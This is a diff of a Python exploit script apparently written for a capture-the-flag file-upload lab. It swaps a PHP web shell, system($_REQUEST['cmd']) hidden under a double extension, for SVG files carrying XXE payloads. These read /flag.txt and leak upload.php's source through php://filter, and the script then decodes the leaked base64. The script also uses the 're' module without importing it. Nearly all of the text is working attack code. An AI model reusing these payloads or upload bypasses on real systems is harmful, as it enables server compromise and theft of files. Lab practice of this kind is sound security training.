@@ -1,17 +1,14 @@
 """ 
 ---------------------------
-Whitelist Filters
+Limited File Upload Exploit
 ---------------------------
-
-1. The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
-
-
 """
 
 # Import Request to send web request to the internet
 import requests
 import sys
 import subprocess
+import base64
 # Module to display output in different colors.
 from colorama import Fore, Back, Style
 """
@@ -51,38 +48,70 @@ def main():
     target = sys.argv[1].strip().rstrip('/')   # from CLI202
     
     # ============================ PHP SCRIPT ============================ #
-    php_web_shell_filename = "shell.phar.png"
-    php_content = "<?php system($_REQUEST['cmd']); ?>"
-    
+    php_web_shell_filename = "htb.lfu.svg"
+    source_code_content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]><svg>&xxe;</svg>'
+    flag_content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><svg>&xxe;</svg>'
+
     # ============================ UPLOAD AND ACCESS URL of TARGET ============================ #
     upload_url = f"http://{target}/upload.php"
     # Specify Profile Images
-    access_url = f"http://{target}/profile_images/{php_web_shell_filename}?cmd=cat%20/flag.txt"
+    access_url = f"http://94.237.120.230:44763/"
+
+    """
+    Q1. The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
     
-    # ============================ UPLOAD FILE TO TARGET, By passing blacklist filters ============================ #
+    """
+    
+    # ============================ UPLOAD FILE TO TARGET, usiing an XXE Payload ============================ #
     # Upload File 
-    upload_response = upload_file(php_web_shell_filename, php_content, upload_url)
+    upload_response = upload_file(php_web_shell_filename, flag_content, upload_url)
     
     # Display upload Response
     print_response(upload_response)
 
     # ============================ ACESS FLAG AND WEBSHELL RESPONSE of TARGET ============================ #
-    web_shell_response = access_web_shell(access_url)
+    svg_flag_response = access_web_shell(access_url)
 
-    # Display Flag / Web Shell Response
-    print_response(web_shell_response)
+    # Display Flag / SVG Shell Response
+    print_response(svg_flag_response)
+
+    """
+    Q2. Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
+    """
+
+    # ============================ UPLOAD FILE TO TARGET, usiing an XXE Payload ============================ #
+    # Upload File 
+    upload_response = upload_file(php_web_shell_filename, source_code_content, upload_url)
+    
+    # Display upload Response
+    print_response(upload_response)
+
+    # ============================ ACESS FLAG AND WEBSHELL RESPONSE of TARGET ============================ #
+    print("\n ############### BASE64 SOURCE CODE DECODED ###############")
+    print_response_base64(upload_response)
 
 
-def upload_file(php_web_shell_filename, php_content, upload_url):
+def upload_file(svg_web_shell_filename, php_content, upload_url):
     # FILE INFORMATION
     files = {
-        # form field name 'file' may vary by app; change if necessary
-        "uploadFile": (php_web_shell_filename, php_content.encode("utf-8"), "application/x-php"),
+        # form field name matches the one in Burp capture
+        "uploadFile": (svg_web_shell_filename, php_content.encode("utf-8"), "image/svg+xml"),
+    }
+    # Add specific headers from Burp capture
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "X-Requested-With": "XMLHttpRequest",
+        "DNT": "1",
+        "Sec-GPC": "1",
+        "Connection": "keep-alive"
     }
     # ============================ Initiate the Request to UPLOAD PHP FILE  ============================ #
     try:
         # WARNING: verify=False disables TLS certificate verification.
-        r = requests.post(upload_url, files=files, verify=False, timeout=10)
+        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
     except requests.RequestException as e:
         print(f"Request failed: {e}")
         sys.exit(2)   
@@ -101,7 +130,20 @@ def access_web_shell(access_url):
     print("\n ############### WEB SHELL RESPONSE WITH FLAG ###############")
     # return response to with flag
     return r
-    
+
+def print_response_base64(response):
+    resp_text = response.text  # from requests
+    m = re.search(r'<svg[^>]*>(.*?)</svg>', resp_text, re.S | re.I)
+    if not m:
+        raise SystemExit("No <svg>...</svg> block found")
+
+    b64 = m.group(1).strip()            # inner text
+    # optional sanity check
+    if not re.match(r'^[A-Za-z0-9+/=\\s]+$', b64):
+        print("Warning: extracted content contains non-base64 chars; proceeding anyway")
+
+    decoded = base64.b64decode(b64)
+    print(decoded.decode('utf-8', errors='replace'))
 
 def print_response(response):
     r = response
